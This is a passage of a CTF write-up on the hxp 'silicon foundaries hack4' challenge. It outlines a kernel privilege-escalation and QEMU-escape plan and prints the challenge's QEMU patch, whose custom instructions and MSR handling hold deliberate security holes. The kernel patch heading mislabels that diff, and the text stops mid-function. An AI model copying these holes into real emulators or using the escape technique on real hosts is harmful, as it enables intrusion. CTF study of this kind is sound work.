---
title: "Writeup: hxp silicon foundaries hack4"
description: "A multi stage exploitation challenge that requires you to exploit custom x86-64 instructions to gain privilege escalation under Linux and then escape the QEMU VM."
pubDate: "Dec 30 2024"
heroImage: "/blog/hxp_38C3_hack4/hxp_38C3_hack4.png"
author: "0x6fe1be2"
---

**Description:**

> You have the great pleasure of sampling our HXP HACK-4 AI1337 processor - an intersection of Security and AI. \
> Like it? We have many in the pipeline!
>
> [Dist](https://2024.ctf.link/assets/files/hxp_silicon_foundaries_hack4-7786be6f6ac42883.tar.xz)
>
> -- <cite>sisu</cite>

# TL;DR

The challenge consists of a modified QEMU binary which adds new instructions to the existing x86-64 set, notably `MTS` (load bytes from scratch memory), `STM` (store bytes to scratch memory) which are unprivileged and `SCRHLW` (update scratch memory) which is privileged. \
Additionally two MSR (Model Specific Registers) where added `MSR_HACK4_SLICE_SIZE=0x400` and `MSR_HACK4_NUM_SLICES=33`
The privileged `SCRHLW` instruction can be access through a patched in `prctl` option `PR_SET_SCRATCH_HOLE` inside the linux kernel and seems to directly update the TLB (Translation Lookaside Buffer) which we can exploit.

1. We exploit the TLB update in `SCRHLW` to inject CPL0 shellcode
2. We modify the MSR to allow OOB Access, they are mapped to a stack array in QEMU
3. we use the OOB Access to write a ROP Chain inside QEMU, to escape and get the flag

# Overview
Lets give a brief overview of the challenge components.

## Files

*hxp_silicon_foundaries_hack4-7786be6f6ac42883.tar.xz*
```
.
└── hxp_silicon_foundaries_hack4
    ├── Dockerfile
    ├── bzImage
    ├── compose.yml
    ├── example_program
    │   ├── ai.s
    │   ├── build.sh
    │   └── main.c
    ├── flag.txt
    ├── hxp_ai1337.pdf
    ├── initramfs.cpio
    ├── launch_vm.sh
    ├── linux_build
    │   └── 0001-Add-PR_SET_SCRATCH_HOLE.patch
    ├── pow-solver
    ├── pow-solver.cpp
    ├── qemu_build
    │   ├── 0001-Add-hack4-ai1337.patch
    │   ├── Dockerfile
    │   └── build_package
    │       ├── bios-256k.bin
    │       ├── efi-e1000.rom
    │       ├── kvmvapic.bin
    │       ├── linuxboot_dma.bin
    │       └── qemu_system_x86_64_ai1337
    └── ynetd

```

### Deployment

The challenge creators where nice enough to give us basically all files necessary for deploying the challenges. This is going to be mostly interesting when exploiting the QEMU binary as this pretty similar to userland exploitation and knowing the correct libraries through the *Dockerfile* will be helpful.

We can also see that the flag is not inside the VM telling us that we will have to escape QEMU if we want to get it.

### Challenge
Now lets look at the more interesting files:

#### Kernel

The kernel related files seem to be rather standard, we have a *initramfs.cpio* which contains our filesystems (Note: kernel challenges normally don't bother booting into a e.g. XFS rootfs and just stay inside the initramfs) and a kernel bzImage (which seems to be `6.12.1`).

We have also been give a kernel patch file, which seems to add a new `prctl` option called `PR_SET_SCRATCH_HOLE` and seems to execute a "new" assembly instruction `SCRHLW`, which has been added through QEMU.

*0001-Add-PR_SET_SCRATCH_HOLE.patch*

<details>

```diff
From 96ef36fd2c2544b7cc5b6c942247f52a4d450f99 Mon Sep 17 00:00:00 2001
From: sisu <contact@hxp.io>
Date: Sun, 1 Dec 2024 18:18:49 +0200
Subject: [PATCH] Add hack4 (ai1337)

---
 docs/specs/hxp_ai1337.rst            | 192 ++++++++++++++++++++++++++
 target/i386/cpu.c                    |  52 +++++++
 target/i386/cpu.h                    |  17 +++
 target/i386/ops_ai1337.h             |   8 ++
 target/i386/tcg/decode-new.c.inc     |  17 +++
 target/i386/tcg/emit.c.inc           |  47 +++++++
 target/i386/tcg/sysemu/excp_helper.c |  12 ++
 target/i386/tcg/sysemu/misc_helper.c |  40 ++++++
 target/i386/tcg/translate.c          | 196 +++++++++++++++++++++++++++
 9 files changed, 581 insertions(+)
 create mode 100644 docs/specs/hxp_ai1337.rst
 create mode 100644 target/i386/ops_ai1337.h

diff --git a/docs/specs/hxp_ai1337.rst b/docs/specs/hxp_ai1337.rst
new file mode 100644
index 000000000..95b6d4280
--- /dev/null
+++ b/docs/specs/hxp_ai1337.rst
@@ -0,0 +1,192 @@
+HXP HACK-4 AI1337 Device Specification
+======================================
+
+The HXP HACK-4 AI1337 is designed to fulfil the compute needs
+of the AI industry. The design is a significant extension to
+the existing X86 architecture to enable fast scratch operations.
+
+High-Level Architecture
+=======================
+
+This section provides a high-level overview of the HXP HACK-4 and
+AI1337 architecture.
+
+Processor Organization
+----------------------
+
+::
+
+  HXP HACK-4 application processor, optimized for scalar compute
+  AI1337 Engine, optimized for very-wide compute
+
+              |------------|---------|-----------|
+              |            |---------|           |
+              | HXP HACK-4 |---------| AI1337 IP |
+              |            |---------|           |
+              |------------|---------|-----------|
+                                |
+                                |
+                      PSCHORR interconnect
+
+  PSCHORR very-wide link
+
+The HXP HACK-4 is the application processor responsible for boot and
+executing OS software. The AI1337 execution engine is on-die engine
+responsible for fast scratch operations.
+
+AI1337 Engine Organization
+--------------------------
+
+::
+
+  --------------------------------------------
+  |               AI1337 engine              |  Execution Interconnect
+  |                                          |  |
+  |------------------------------------------|  |
+  | Slice 0                                  |-----|   --------------------
+  |------------------------------------------|     |---| Multi-ALU engine |
+  | Slice 1                                  |-----|   --------------------
+  |------------------------------------------|     |
+  | Slice 2                                  |-----|   --------------------
+  |------------------------------------------|     |---| Multi-ALU engine |
+  | ...                                      |-----|   --------------------
+  |------------------------------------------|     |
+  | Slice N                                  |-----|   --------------------
+  |------------------------------------------|     |---| Multi-ALU engine |
+                                                       --------------------
+
+The AI1337 engine is organized as a vector of interconnected memory slices.
+Slices are interconnected via the 'execution interconnect' in an N-to-N
+fashion, and each cross-slice wide-link is connected to a series of
+multi-ALU engines that support fast addition, subtraction and multiplication.
+
+PSCHORR Interconnect
+--------------------
+
+The PSCHORR Interconnect connects the HACK-4 application processor
+and the AI1337 Engine using a multi-link organization for fast
+slice reads and writes.
+
+The interconnect allows also for addressability of the scratch memory
+through an bi-ATS unit that supports bi-directional addressing of scratch
+and application processor memory.
+
+::
+
+      Physical Memory                Virtual Memory
+            0                               |
+            |                               |
+  IO space  |                               |
+            |                               |
+            -                               |
+            |                               |
+            |                               |
+            |                               |   Direct Addressing
+    RAM     |                               |           |
+            |    ___________________________|_____      |
+            |   /                       |        |      |
+            ---/                        | bi-ATS |------|
+            |                           |        |
+            |    _______________________|________|
+  AI1337    |   /
+ aperture   |  /  PSCHORR Interconnect
+            ---
+
+ISA Contributions
+=================
+
+This section describes the ISA contributions to the X86_64 ISA.
+The added instructions are responsible for updating scratch memory
+on the AI1337 engine and for submitting work to the AI1337 engine.
+The ISA also includes instructions for fast reconfiguration of the
+PSCHORR interconnect.
+
+
+.. list-table:: ISA
+   :widths: 25 25 50
+   :header-rows: 1
+
+   * - Opcode
+     - Instruction
+     - Description
+   * - 0F 0A 83
+     - MTS
+     - Load RCX bytes from memory address (RSI) to slice (RBX) at slice offset (RDI)
+   * - 0F 0A 84
+     - STM
+     - Read RCX bytes from slice (RBX) at slice offset (RDI) and write memory address (RSI) 
+   * - 0F 0A 85
+     - FSCR
+     - Clear all slices
+   * - 0F 0A 86
+     - SCRADD
+     - Add the slices pointed by RDI and RSI, and store the result into slice pointed by RDX
+   * - 0F 0A 87
+     - SCRSUB
+     - Subtract the slices pointed by RDI and RSI, and store the result into slice pointed by RDX
+   * - 0F 0A 88
+     - SCRMUL
+     - Multiply the slices pointed by RDI and RSI, and store the result into slice pointed by RDX
+   * - 0F 0A 89
+     - SCRHLW (privileged)
+     - Update scratch memory PSCHORR bi-ATS base VA
+   * - 0F 0A 8A
+     - SCRHLR
+     - Read scratch memory PSCHORR bi-ATS base VA
+
+System-Level Contributions
+==========================
+
+This section provides information on system-level specification and configuration,
+and it's primarily targeted towards kernel developers.
+
+Specification
+-------------
+
+The AI1337 engine support is dictated by the existence of the 0x80000022 CPUID leaf.
+If the AI1337 CPUID leaf exists, the EAX, ECX, EDX and EBX registers provide the following information:
+
+.. list-table:: CPUID 0x80000022
+   :widths: 25 25 50
+   :header-rows: 1
+
+   * - Register
+     - Bits
+     - Information
+   * - EAX
+     - 0-31
+     - Total scratch memory size
+   * - ECX
+     - 0-9
+     - Maximum number of slices
+   * - ECX
+     - 10-31
+     - Maximum slice size in bytes
+   * - EDX
+     - 0-31
+     - Low 32 bits of the AI1337 Aperture
+   * - EBX
+     - 0-31
+     - High 32 bits of the AI1337 Aperture
+
+Configuration
+-------------
+
+The AI1337 engine is a multi-configurable engine that software can
+utilize for scaling up for high-computing workloads and scaling
+down for power-efficiency.
+
+.. list-table:: MSR
+   :widths: 40 25 50
+   :header-rows: 1
+
+   * - MSR
+     - Identifier
+     - Description
+   * - MSR_HACK4_SLICE_SIZE
+     - 0xC0000105
+     - Read/Write slice size in the AI1337 engine
+   * - MSR_HACK4_NUM_SLICES
+     - 0xC0000106
+     - Read/Write count of slices in the AI1337 engine
+
diff --git a/target/i386/cpu.c b/target/i386/cpu.c
index 85ef7452c..197a813f7 100644
--- a/target/i386/cpu.c
+++ b/target/i386/cpu.c
@@ -43,9 +43,13 @@
 #include "hw/i386/sgx-epc.h"
 #endif
 
+#include "exec/ramblock.h"
+
 #include "disas/capstone.h"
 #include "cpu-internal.h"
 
+#include "ops_ai1337.h"
+
 static void x86_cpu_realizefn(DeviceState *dev, Error **errp);
 
 /* Helpers for building CPUID[2] descriptors: */
@@ -5256,6 +5260,26 @@ static const X86CPUDefinition builtin_x86_defs[] = {
         .model_id = "AMD EPYC-Genoa Processor",
         .cache_info = &epyc_genoa_cache_info,
     },
+    {
+        .name = "hxp-ai1337",
+        .level = 0xd,
+        .vendor = CPUID_VENDOR_AMD,
+        .family = 25,
+        .model = 1,
+        .stepping = 1,
+        .features[FEAT_1_EDX] =
+            PPRO_FEATURES |
+            CPUID_MTRR | CPUID_CLFLUSH | CPUID_MCA |
+            CPUID_PSE36,
+        .features[FEAT_1_ECX] =
+            CPUID_EXT_SSE3 | CPUID_EXT_CX16 | CPUID_EXT_RDRAND,
+        .features[FEAT_8000_0001_EDX] =
+            CPUID_EXT2_LM | CPUID_EXT2_SYSCALL | CPUID_EXT2_NX,
+        .features[FEAT_8000_0001_ECX] =
+            CPUID_EXT3_LAHF_LM | CPUID_EXT3_SVM,
+        .xlevel = 0x80000022,
+        .model_id = "HXP Silicon Foundaries AI 1337 Processor",
+    },
 };
 
 /*
@@ -5688,6 +5712,11 @@ static inline void feat2prop(char *s)
     }
 }
 
+uint64_t x86_calculate_scratch_size(CPUX86State* env)
+{
+    return (env->scratch_config.slice_size * env->scratch_config.num_active_slices);
+}
+
 /* Return the feature property name for a feature flag bit */
 static const char *x86_cpu_feature_name(FeatureWord w, int bitnr)
 {
@@ -7044,6 +7073,13 @@ void cpu_x86_cpuid(CPUX86State *env, uint32_t index, uint32_t count,
         *eax = env->features[FEAT_8000_0021_EAX];
         *ebx = *ecx = *edx = 0;
         break;
+    case 0x80000022:
+        *eax = *ebx = *ecx = *edx = 0;
+        *ecx = (AI1337_SCRATCH_MAX_SLICE_SIZE << 10) | AI1337_SCRATCH_MAX_NUM_SLICES;
+        *eax = AI1337_SCRATCH_SIZE;
+        *edx = (AI1337_SCRATCH_PHYS_BASE & 0xFFFFFFFFU);
+        *ebx = ((AI1337_SCRATCH_PHYS_BASE >> 32U) & 0xFFFFFFFFU);
+        break;
     default:
         /* reserved values: zero */
         *eax = 0;
@@ -8052,6 +8088,22 @@ static void x86_cpu_initfn(Object *obj)
     if (xcc->model) {
         x86_cpu_load_model(cpu, xcc->model);
     }
+
+    {
+        env->scratch_config.num_active_slices = AI1337_SCRATCH_NUM_SLICES_DEFAULT;
+        env->scratch_config.slice_size = AI1337_SCRATCH_SLICE_SIZE_DEFAULT;
+        env->scratch_config.va_base = AI1337_SCRATCH_VA_BASE;
+        env->scratch_config.phys_base = AI1337_SCRATCH_PHYS_BASE;
+        env->scratch_config.access_enabled = 0;
+
+        uint16_t scratch[AI1337_SCRATCH_SIZE];
+        env->scratch_region = malloc(sizeof(MemoryRegion));
+        memset(env->scratch_region, 0, sizeof(*env->scratch_region));
+        memory_region_init_ram_ptr(env->scratch_region, NULL, "ai1337-scratch", AI1337_SCRATCH_SIZE, scratch);
+        env->scratch_region->ram_block->flags |= RAM_RESIZEABLE;
+        env->scratch_region->ram_block->max_length = AI1337_SCRATCH_MAX_NUM_SLICES * AI1337_SCRATCH_MAX_SLICE_SIZE;
+        memory_region_add_subregion(get_system_memory(), AI1337_SCRATCH_PHYS_BASE, env->scratch_region);
+    }
 }
 
 static int64_t x86_cpu_get_arch_id(CPUState *cs)
diff --git a/target/i386/cpu.h b/target/i386/cpu.h
index 14edd57a3..778c9a730 100644
--- a/target/i386/cpu.h
+++ b/target/i386/cpu.h
@@ -544,6 +544,9 @@ typedef enum X86Seg {
 #define MSR_IA32_XFD                    0x000001c4
 #define MSR_IA32_XFD_ERR                0x000001c5
 
+#define MSR_HACK4_SLICE_SIZE            0xc0000105
+#define MSR_HACK4_NUM_SLICES            0xc0000106
+
 /* FRED MSRs */
 #define MSR_IA32_FRED_RSP0              0x000001cc       /* Stack level 0 regular stack pointer */
 #define MSR_IA32_FRED_RSP1              0x000001cd       /* Stack level 1 regular stack pointer */
@@ -1681,6 +1684,14 @@ typedef struct HVFX86LazyFlags {
     target_ulong auxbits;
 } HVFX86LazyFlags;
 
+typedef struct ScratchConfig {
+    uint64_t va_base;
+    uint64_t phys_base;
+    size_t num_active_slices;
+    size_t slice_size;
+    int access_enabled;
+} ScratchConfig;
+
 typedef struct CPUArchState {
     /* standard registers */
     target_ulong regs[CPU_NB_REGS];
@@ -1996,6 +2007,10 @@ typedef struct CPUArchState {
 
     /* Bitmap of available CPU topology levels for this CPU. */
     DECLARE_BITMAP(avail_cpu_topo, CPU_TOPO_LEVEL_MAX);
+
+    MemoryRegion *scratch_region;
+    ScratchConfig scratch_config;
+
 } CPUX86State;
 
 struct kvm_msrs;
@@ -2639,6 +2654,8 @@ void x86_cpu_xsave_all_areas(X86CPU *cpu, void *buf, uint32_t buflen);
 uint32_t xsave_area_size(uint64_t mask, bool compacted);
 void x86_update_hflags(CPUX86State* env);
 
+uint64_t x86_calculate_scratch_size(CPUX86State* env);
+
 static inline bool hyperv_feat_enabled(X86CPU *cpu, int feat)
 {
     return !!(cpu->hyperv_features & BIT(feat));
diff --git a/target/i386/ops_ai1337.h b/target/i386/ops_ai1337.h
new file mode 100644
index 000000000..7aea6ae78
--- /dev/null
+++ b/target/i386/ops_ai1337.h
@@ -0,0 +1,8 @@
+
+#define AI1337_SCRATCH_VA_BASE 0xFFFFFFFFFFA00000ULL
+#define AI1337_SCRATCH_PHYS_BASE 0xFFFFFFFFFFF00000ULL
+#define AI1337_SCRATCH_SIZE (33ULL * 1024)
+#define AI1337_SCRATCH_MAX_NUM_SLICES (128)
+#define AI1337_SCRATCH_SLICE_SIZE_DEFAULT (1024ULL)
+#define AI1337_SCRATCH_NUM_SLICES_DEFAULT (33UL)
+#define AI1337_SCRATCH_MAX_SLICE_SIZE (4096ULL)
diff --git a/target/i386/tcg/decode-new.c.inc b/target/i386/tcg/decode-new.c.inc
index 30be9237c..968042464 100644
--- a/target/i386/tcg/decode-new.c.inc
+++ b/target/i386/tcg/decode-new.c.inc
@@ -1032,6 +1032,21 @@ static void decode_0F5A(DisasContext *s, CPUX86State *env, X86OpEntry *entry, ui
     *entry = *decode_by_prefix(s, opcodes_0F5A);
 }
 
+static void decode_0F0A(DisasContext *s, CPUX86State *env, X86OpEntry *entry, uint8_t *b)
+{
+    uint8_t c = x86_ldub_code(env, s);
+    switch (c) {
+    case 0x83: entry->gen = gen_MTS; break;
+    case 0x84: entry->gen = gen_STM; break;
+    case 0x85: entry->gen = gen_FSCR; break;
+    case 0x86: entry->gen = gen_SCRADD; break;
+    case 0x87: entry->gen = gen_SCRSUB; break;
+    case 0x88: entry->gen = gen_SCRMUL; break;
+    case 0x89: entry->gen = gen_SCRHLW; break;
+    case 0x8a: entry->gen = gen_SCRHLR; break;
+    }
+}
+
 static void decode_0F5B(DisasContext *s, CPUX86State *env, X86OpEntry *entry, uint8_t *b)
 {
     static const X86OpEntry opcodes_0F5B[4] = {
@@ -1273,6 +1288,8 @@ static const X86OpEntry opcodes_0F[256] = {
     [0x7e] = X86_OP_GROUP0(0F7E),
     [0x7f] = X86_OP_GROUP0(0F7F),
 
+    [0x0a] = X86_OP_GROUP0(0F0A),
+
     [0x88] = X86_OP_ENTRYr(Jcc, J,z_f64),
     [0x89] = X86_OP_ENTRYr(Jcc, J,z_f64),
     [0x8a] = X86_OP_ENTRYr(Jcc, J,z_f64),
diff --git a/target/i386/tcg/emit.c.inc b/target/i386/tcg/emit.c.inc
index 9b5041991..9a2e57b8f 100644
--- a/target/i386/tcg/emit.c.inc
+++ b/target/i386/tcg/emit.c.inc
@@ -3853,6 +3853,53 @@ static void gen_SUB(DisasContext *s, X86DecodedInsn *decode)
     prepare_update2_cc(decode, s, CC_OP_SUBB + ot);
 }
 
+static void gen_MTS(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_repz(s, MO_8, gen_mts_8);
+}
+
+static void gen_FSCR(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_fscr(s);
+}
+
+static void gen_SCRHLW(DisasContext *s, X86DecodedInsn *decode)
+{
+    if (CPL(s) != 0)
+    {
+        gen_illegal_opcode(s);
+        return;
+    }
+    size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    tcg_gen_st_tl(cpu_regs[R_EDI], tcg_env, va_base_offset);
+}
+
+static void gen_SCRHLR(DisasContext *s, X86DecodedInsn *decode)
+{
+    size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    tcg_gen_ld_tl(cpu_regs[R_EAX], tcg_env, va_base_offset);
+}
+
+static void gen_STM(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_repz(s, MO_8, gen_stm_8);
+}
+
+static void gen_SCRADD(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_slice_op(s, SLICE_OP_TYPE_ADD);
+}
+
+static void gen_SCRSUB(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_slice_op(s, SLICE_OP_TYPE_SUB);
+}
+
+static void gen_SCRMUL(DisasContext *s, X86DecodedInsn *decode)
+{
+    gen_slice_op(s, SLICE_OP_TYPE_MUL);
+}
+
 static void gen_SYSCALL(DisasContext *s, X86DecodedInsn *decode)
 {
     gen_update_cc_op(s);
diff --git a/target/i386/tcg/sysemu/excp_helper.c b/target/i386/tcg/sysemu/excp_helper.c
index 8fb05b1f5..f524f97c2 100644
--- a/target/i386/tcg/sysemu/excp_helper.c
+++ b/target/i386/tcg/sysemu/excp_helper.c
@@ -23,6 +23,7 @@
 #include "exec/exec-all.h"
 #include "exec/page-protection.h"
 #include "tcg/helper-tcg.h"
+#include "../../ops_ai1337.h"
 
 typedef struct TranslateParams {
     target_ulong addr;
@@ -600,6 +601,17 @@ bool x86_cpu_tlb_fill(CPUState *cs, vaddr addr, int size,
     TranslateResult out;
     TranslateFault err;
 
+    if (env->scratch_config.access_enabled &&
+        (addr >= env->scratch_config.va_base) &&
+        ((addr + size) <= (env->scratch_config.va_base + x86_calculate_scratch_size(env)))) {
+        vaddr paddr = env->scratch_config.phys_base + (addr - env->scratch_config.va_base);
+        tlb_set_page_with_attrs(cs, addr & TARGET_PAGE_MASK,
+                                paddr & TARGET_PAGE_MASK,
+                                cpu_get_mem_attrs(env),
+                                PAGE_READ | PAGE_WRITE | PAGE_EXEC, mmu_idx, TARGET_PAGE_SIZE);
+        return true;
+    }
+
     if (get_physical_address(env, addr, access_type, mmu_idx, &out, &err,
                              retaddr)) {
         /*
diff --git a/target/i386/tcg/sysemu/misc_helper.c b/target/i386/tcg/sysemu/misc_helper.c
index 094aa56a2..78fd3a573 100644
--- a/target/i386/tcg/sysemu/misc_helper.c
+++ b/target/i386/tcg/sysemu/misc_helper.c
@@ -26,6 +26,7 @@
 #include "exec/exec-all.h"
 #include "tcg/helper-tcg.h"
 #include "hw/i386/apic.h"
+#include "../../ops_ai1337.h"
 
 void helper_outb(CPUX86State *env, uint32_t port, uint32_t data)
 {
@@ -128,6 +129,27 @@ void helper_write_crN(CPUX86State *env, int reg, target_ulong t0)
     }
 }
 
+static bool helper_recalculate_scratch(CPUX86State *env, uint32_t new_num_slices, uint32_t new_slice_size)
+{
+    if (new_num_slices > AI1337_SCRATCH_MAX_NUM_SLICES) {
+        return false;
+    }
+    if (new_slice_size > AI1337_SCRATCH_MAX_SLICE_SIZE) {
+        return false;
+    }
+    uint32_t new_size = new_num_slices * new_slice_size;
+    Error *err = NULL;
+    bql_lock();
+    memory_region_ram_resize(env->scratch_region, new_size, &err);
+    bql_unlock();
+    if (err) {
+        return false;
+    }
+    env->scratch_config.num_active_slices = new_num_slices;
+    env->scratch_config.slice_size = new_slice_size;
+    return true;
+}
+
 void helper_wrmsr(CPUX86State *env)
 {
     uint64_t val;
@@ -306,6 +328,18 @@ void helper_wrmsr(CPUX86State *env)
 
         break;
     }
+    case MSR_HACK4_SLICE_SIZE:
+        const uint32_t new_slice_size = val;
+        if (!helper_recalculate_scratch(env, env->scratch_config.num_active_slices, new_slice_size)) {
+            goto error;
+        }
+        break;
+    case MSR_HACK4_NUM_SLICES:
+        const uint32_t new_num_active_slices = val;
+        if (!helper_recalculate_scratch(env, new_num_active_slices, env->scratch_config.slice_size)) {
+            goto error;
+        }
+        break;
     default:
         if ((uint32_t)env->regs[R_ECX] >= MSR_MC0_CTL
             && (uint32_t)env->regs[R_ECX] < MSR_MC0_CTL +
@@ -333,6 +367,12 @@ void helper_rdmsr(CPUX86State *env)
     cpu_svm_check_intercept_param(env, SVM_EXIT_MSR, 0, GETPC());
 
     switch ((uint32_t)env->regs[R_ECX]) {
+    case MSR_HACK4_SLICE_SIZE:
+        val = env->scratch_config.slice_size;
+        break;
+    case MSR_HACK4_NUM_SLICES:
+        val = env->scratch_config.num_active_slices;
+        break;
     case MSR_IA32_SYSENTER_CS:
         val = env->sysenter_cs;
         break;
diff --git a/target/i386/tcg/translate.c b/target/i386/tcg/translate.c
index 98f5fe61e..0fd28c60f 100644
--- a/target/i386/tcg/translate.c
+++ b/target/i386/tcg/translate.c
@@ -21,6 +21,7 @@
 #include "qemu/host-utils.h"
 #include "cpu.h"
 #include "exec/exec-all.h"
+#include "tcg/tcg-op-common.h"
 #include "tcg/tcg-op.h"
 #include "tcg/tcg-op-gvec.h"
 #include "exec/translator.h"
@@ -32,6 +33,8 @@
 
 #include "exec/log.h"
 
+#include "ops_ai1337.h"
+
 #define HELPER_H "helper.h"
 #include "exec/helper-info.c.inc"
 #undef  HELPER_H
@@ -1198,6 +1201,199 @@ static void gen_stos(DisasContext *s, MemOp ot)
     gen_op_add_reg(s, s->aflag, R_EDI, gen_compute_Dshift(s, ot));
 }
 
+static void gen_fscr(DisasContext *s)
+{
+    TCGLabel *l1 = gen_new_label();
+    TCGLabel *l2 = gen_new_label();
+
+    const size_t slice_size_offset = offsetof(CPUX86State, scratch_config.slice_size);
+    const size_t slice_count_offset = offsetof(CPUX86State, scratch_config.num_active_slices);
+    const size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    const size_t access_offset = offsetof(CPUX86State, scratch_config.access_enabled);
+
+    tcg_gen_st_tl(tcg_constant_i64(1), tcg_env, access_offset);
+
+    // Calculate size
+    tcg_gen_ld32u_tl(s->tmp0, tcg_env, slice_size_offset);
+    tcg_gen_ld32u_tl(s->tmp4, tcg_env, slice_count_offset);
+    tcg_gen_mul_tl(s->tmp0, s->tmp0, s->tmp4);
+
+    // For loop to clear memory
+    gen_set_label(l1);
+    gen_update_cc_op(s);
+    TCGv tmp = gen_ext_tl(NULL, s->tmp0, s->aflag, false);
+    tcg_gen_brcondi_tl(TCG_COND_EQ, tmp, 0, l2);
+    tcg_gen_sub_tl(s->tmp0, s->tmp0, tcg_constant_i64(1));
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+    gen_op_st_v(s, MO_8, tcg_constant_i64(0), s->A0);
+    tmp = gen_ext_tl(NULL, s->tmp0, s->aflag, false);
+    tcg_gen_brcondi_tl(TCG_COND_NE, tmp, 0, l1);
+    gen_set_label(l2);
+
+    tcg_gen_st_tl(tcg_constant_i64(0), tcg_env, access_offset);
+}
+
+typedef enum SLICE_OP_TYPE {
+    SLICE_OP_TYPE_ADD,
+    SLICE_OP_TYPE_SUB,
+    SLICE_OP_TYPE_MUL,
+} SLICE_OP_TYPE;
+
+static void gen_illegal_opcode(DisasContext *s);
+
+static void gen_slice_op(DisasContext *s, SLICE_OP_TYPE op_type)
+{
+    TCGLabel *l1 = gen_new_label();
+    TCGLabel *l2 = gen_new_label();
+
+    const size_t slice_size_offset = offsetof(CPUX86State, scratch_config.slice_size);
+    const size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    const size_t access_offset = offsetof(CPUX86State, scratch_config.access_enabled);
+
+    const TCGv slice_a = cpu_regs[R_EDI];
+    const TCGv slice_b = cpu_regs[R_ESI];
+    const TCGv slice_c = cpu_regs[R_EDX];
+
+    tcg_gen_st_tl(tcg_constant_i64(1), tcg_env, access_offset);
+
+    // slice size
+    tcg_gen_ld32u_tl(s->tmp0, tcg_env, slice_size_offset);
+
+    // tmp4 always holds the const slice size
+    tcg_gen_mov_tl(s->tmp4, s->tmp0);
+
+    // For loop to clear memory
+    gen_set_label(l1);
+    gen_update_cc_op(s);
+    TCGv tmp = gen_ext_tl(NULL, s->tmp0, s->aflag, false);
+    tcg_gen_brcondi_tl(TCG_COND_EQ, tmp, 0, l2);
+
+    // slice_size -= 8
+    tcg_gen_sub_tl(s->tmp0, s->tmp0, tcg_constant_i64(8));
+
+    // load slice_a value into T1
+    // A0, T1 initialized
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_mul_tl(s->T1, slice_a, s->tmp4);
+    tcg_gen_add_tl(s->A0, s->A0, s->T1);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+    gen_op_ld_v(s, MO_64, s->T1, s->A0);
+
+    // load slice_b value into T0
+    // A0, T0 initialized
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_mul_tl(s->T0, slice_b, s->tmp4);
+    tcg_gen_add_tl(s->A0, s->A0, s->T0);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+    gen_op_ld_v(s, MO_64, s->T0, s->A0);
+
+    // T0 holds the result of the operation
+    switch (op_type)
+    {
+    case SLICE_OP_TYPE_ADD:
+        tcg_gen_add_tl(s->T0, s->T1, s->T0);
+        break;
+    case SLICE_OP_TYPE_SUB:
+        tcg_gen_sub_tl(s->T0, s->T1, s->T0);
+        break;
+    case SLICE_OP_TYPE_MUL:
+        tcg_gen_mul_tl(s->T0, s->T1, s->T0);
+        break;
+    default:
+        gen_illegal_opcode(s);
+        return;
+    }
+
+    // Calculate address for slice_c slot
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_mul_tl(s->T1, slice_c, s->tmp4);
+    tcg_gen_add_tl(s->A0, s->A0, s->T1);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+    gen_op_st_v(s, MO_64, s->T0, s->A0);
+
+    tmp = gen_ext_tl(NULL, s->tmp0, s->aflag, false);
+    tcg_gen_brcondi_tl(TCG_COND_NE, tmp, 0, l1);
+    gen_set_label(l2);
+
+    tcg_gen_st_tl(tcg_constant_i64(0), tcg_env, access_offset);
+}
+
+static void gen_mts_8(DisasContext *s, MemOp ot)
+{
+    const size_t slice_size_offset = offsetof(CPUX86State, scratch_config.slice_size);
+    const size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    const size_t access_offset = offsetof(CPUX86State, scratch_config.access_enabled);
+
+    const TCGv slice_index = cpu_regs[R_EBX];
+    const TCGv offset_in_slice = cpu_regs[R_EDI];
+    const TCGv memory_address = cpu_regs[R_ESI];
+    const TCGv dshift = gen_compute_Dshift(s, ot);
+
+    tcg_gen_st_tl(tcg_constant_i64(1), tcg_env, access_offset);
+
+    // load from memory address
+    gen_lea_v_seg(s, memory_address, R_DS, -1);
+    gen_op_ld_v(s, MO_8, s->T0, s->A0);
+
+    // Calculate address for scratch
+    // A0 = offset_in_slice + slice_base + (slice_index * slice_size)
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_add_tl(s->A0, s->A0, offset_in_slice);
+    tcg_gen_ld32u_tl(s->tmp0, tcg_env, slice_size_offset);
+    tcg_gen_mul_tl(s->tmp0, s->tmp0, slice_index);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+
+    // Store value
+    gen_op_st_v(s, MO_8, s->T0, s->A0);
+
+    gen_op_add_reg(s, s->aflag, R_ESI, dshift);
+    gen_op_add_reg(s, s->aflag, R_EDI, dshift);
+
+    tcg_gen_st_tl(tcg_constant_i64(0), tcg_env, access_offset);
+}
+
+static void gen_stm_8(DisasContext *s, MemOp ot)
+{
+    const size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
+    const size_t slice_size_offset = offsetof(CPUX86State, scratch_config.slice_size);
+    const size_t access_offset = offsetof(CPUX86State, scratch_config.access_enabled);
+
+    const TCGv slice_index = cpu_regs[R_EBX];
+    const TCGv offset_in_slice = cpu_regs[R_EDI];
+    const TCGv memory_address = cpu_regs[R_ESI];
+    const TCGv dshift = gen_compute_Dshift(s, ot);
